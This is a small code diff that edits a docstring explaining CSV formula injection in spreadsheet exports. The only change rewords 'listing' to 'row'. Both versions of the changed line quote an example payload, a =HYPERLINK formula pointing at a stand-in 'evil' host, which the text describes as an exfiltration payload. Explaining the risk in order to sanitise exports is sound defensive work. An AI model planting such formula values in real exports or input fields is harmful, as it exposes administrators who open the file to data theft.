@@ -5,7 +5,7 @@ titles, names, descriptions, anything an outside party
 controls — directly into a ``.csv`` file, Excel / LibreOffice /
 Numbers will interpret any cell whose first character is one of
 ``=``, ``+``, ``-``, ``@``, TAB, or CR as a **formula**. A hostile
-listing titled ``=HYPERLINK("http://evil/...", "Click")`` then
+row titled ``=HYPERLINK("http://evil/...", "Click")`` then
 executes as a clickable exfiltration payload the moment the admin
 opens the export.
 
